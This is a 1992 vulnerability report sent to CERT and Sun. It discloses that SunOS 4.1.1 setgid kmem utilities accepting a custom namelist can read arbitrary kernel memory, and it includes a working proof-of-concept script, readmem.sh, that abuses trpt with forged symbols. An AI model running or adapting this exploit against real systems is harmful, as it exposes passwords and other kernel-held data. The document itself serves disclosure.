@@ -1,0 +1,213 @@
+Date: Fri, 24 Jan 1992 23:28:51 +1030c
+From: gordoni@cs.adelaide.edu.au (Gordon Irlam)
+To: cert@cert.sei.cmu.edu, sunbugs@sun.com
+Subject: System namelist specification can be used to read kernel memory
+Index: usr.bin net2
+
+Summary: System namelist specification can be used to read kernel memory
+
+Submitter: Gordon Irlam
+Internet: gordoni@cs.adelaide.edu.au
+Fax: +61 8 223 1206
+Phone: +61 8 228 5309
+Post: Department of Computer Science, University of Adelaide,
+      GPO Box 498, Adelaide 5001,
+      Australia
+
+Customer bug number: 17
+Date: 1992-01-24
+
+Product: SunOS 4.1.1 (sun4/sun4c)
+
+- ----------------------------------------------------------------------
+This is a bug whose possible existence was recently hypothesised in
+the Usenet news groups comp.os.minix and comp.unix.wizards.  The
+nature of this bug is not specific to SunOS, although the details of
+its exploitation given here almost certainly are.
+
+Setgid kmem utilities that allow the specification of the file from
+which the system namelist is obtained can be used to read arbitrary
+locations in kernel memory.
+
+The following example shows this.
+
+< ./readmem.sh -w `nm /vmunix | awk '/ _time$/ {print "0x"$1}'`
+0xf80f4468: 0x297ff0e0
+0xf80f4468: 0x297ff0e1
+0xf80f4468: 0x297ff0e1
+0xf80f4468: 0x297ff0e1
+0xf80f4468: 0x297ff0e1
+0xf80f4468: 0x297ff0e2
+0xf80f4468: 0x297ff0e2
+0xf80f4468: 0x297ff0e2
+0xf80f4468: 0x297ff0e3
+0xf80f4468: 0x297ff0e3
+0xf80f4468: 0x297ff0e3
+0xf80f4468: 0x297ff0e4
+^C
+<
+
+The script readmem.sh is included at the end of this message.  In the
+above example it was used to read the value of the kernel's _time
+variable, which is incremented once per second.
+
+The script works by creating a dummy namelist file with intentionally
+erroneous symbol values and then running trpt (8) using this dummy
+namelist in place of the default namelist, /vmunix.  This causes the
+memory referenced by the intentionally erroneous symbol values to be
+read, and its contents displayed.
+
+The script does not require read access to the current symbol values
+in /vmunix to work successfully.  Although if it can read /vmunix it
+will since doing so is likely to increase the robustness of the
+script.
+
+It is the general concept of allowing a user to specify a namelist
+file, and not just the trpt (8) utility that displays this bug.  The
+following utilities would all appear to suffer from this same problem:
+ipcs (1), ps (1), arp (8), kgmon (8), netstat (8), pstat (8), trpt
+(8).  The preceeding list may not be exhaustive.  In the case of ipcs
+(1) and ps (1) it is speculated that it would be reasonably difficult
+to exploit this bug to usefully read kernel memory.  I have found it
+to be relatively easy to read kernel memory using arp (8) by altering
+the namelist symbol _arptab.  I speculate that it would probably also
+be fairly easy to read kernel memory using kgmon (8) or netstat (8).
+I was also able to read kernel memory using pstat (8) by manipulating
+_anoninfo, and using trpt (8) by manipulating _tcp_debx.
+
+The attached script is intended to only demonstrate the presence of
+this bug.  The speed with which kernel memory is read could be
+dramatically increased by writing a similar program in C.  And the
+quantity of data read in each invocation could also be significantly
+increased by using kgmon (8) rather than trpt (8) to read the kernel
+memory.  Although this bug is felt to be very general, the script is
+very operating system specific.  It will only work under SunOS, and
+quite possibly only under SunOS 4.1.1.
+
+While involving a considerable amount of tedious programming effort -
+perhaps 3 or 4 days work - it would almost certainly be possible to
+exploit this bug to read passwords being typed, disk buffers, and
+other sensitive data.  On some other operating systems where these
+utilities are installed setuid root this bug could probably also be
+used to read the contents of an arbitrary file by specifying an
+alternative core file in addition to the alternative namelist.
+
+Start of file readmem.sh ---------------------------------------------
+#!/bin/sh
+#
+# Program to read a kernel memory address.
+#
+# Usage:
+#     readmem [ -w ] kernel_address
+#         -w: loop endlessly examining address.
+
+# Process arguments.
+
+WATCH=0
+while test -n "$1"; do
+  case $1 in
+    -w) # Loop endlessly examining address.
+      WATCH=1
+      shift
+      ;;
+    *)
+      break
+      ;;
+  esac
+done
+
+if test $# = 1; then
+  # The kernel address to be examined.
+  TARGET_ADDR=$1
+else
+  echo "$0: Usage"
+  echo "    $0 [ -w ] kernel_address"
+  exit 2
+fi
+
+# The following value must be a kernel address containing a pointer to
+# kernel memory.
+#
+# The easiest way to find a suitable address is to read a well known
+# pointer address from /vmunix.  If /vmunix is not readable we resort
+# to using special knowledge of the kernel.  Namely, the instruction
+# at address st_user+0x30 can also be interpreted as a valid pointer,
+# and thus constitutes a suitable address, and that the location of
+# this instruction is independent of whether a customized kernel has
+# been installed.  Furthermore the actual value of st_user+0x30 has a
+# known albeit kernel architecture specific value.  This special
+# knowledge is probably only applicable to SunOS 4.1.1.
+KMEM_PTR_ADDR=`nm /vmunix | awk '/ _proc$/ {print "0x"$1}'`
+if test -z "$KMEM_PTR_ADDR"; then
+  if sun4; then
+    KMEM_PTR_ADDR=0xf8006284
+  elif sun4c; then
+    KMEM_PTR_ADDR=0xf80052e0
+  else
+    echo "$0: Unknown kernel architecture."; exit 1
+  fi
+fi
+
+# Create file defining appropriate symbol values.
+
+cat > readmem.S <<END
+#define TARGET_ADDR $TARGET_ADDR
+#define KMEM_ADDR 0xf8004000
+#define KMEM_PTR_ADDR $KMEM_PTR_ADDR
+
+! The following values must be defined for the kvm_open(3k) routine to
+! work.
+
+! For the first group of symbols and the trpt utility their exact
+! values are not important so long as they are valid kernel addresses.
+! For some other system utilities their exact value may be important.
+_swapinfo = KMEM_ADDR
+_page_hash = KMEM_ADDR
+_page_hashsz = KMEM_ADDR
+_proc = KMEM_ADDR
+_nproc = KMEM_ADDR
+_Sysmap = KMEM_ADDR
+_econtig = KMEM_ADDR
+_kseg = KMEM_ADDR
+_segkmem_ops = KMEM_ADDR
+
+! The next symbol should be the address of a structure whose second
+! word is a kernel pointer.
+_kas = KMEM_PTR_ADDR - 4
+
+! The following values must be defined for the trpt utility to work.
+
+! This symbol is normally the address of the TCP debug buffer.
+! Setting it to 0 will cause trpt to crash.  But this will not matter
+! since we will have already obtained the information we need.  This
+! actually speeds things up marginally because the buffer, which is
+! roughly 16k in size, will not be copied.
+_tcp_debug = 0
+
+! This symbol gives the address of the word we want to examine.
+_tcp_debx = TARGET_ADDR
+
+! We don't need any code, just the symbol table is enough.  We define
+! _main to keep the linker happy.
+.globl _main
+_main:
+END
+
+# Compile the file, execute the trpt utility, and display the results.
+# trpt is executed with the generated file being used to provide the
+# system namelist.
+cc readmem.S -o readmem.nl &&
+while true; do
+  /usr/etc/trpt readmem.nl 2> /dev/null \
+    | awk -F= '{printf "%s: 0x%x\n", "'$TARGET_ADDR'", $2}
+               END {if (NR==0) {{print "'$0': Illegal address."} exit 1}}' \
+    || exit 1
+  if test $WATCH = 0; then
+    exit 0;
+  fi
+done
+End of file readmem.sh -----------------------------------------------
+
+------- End of Forwarded Message
+
+
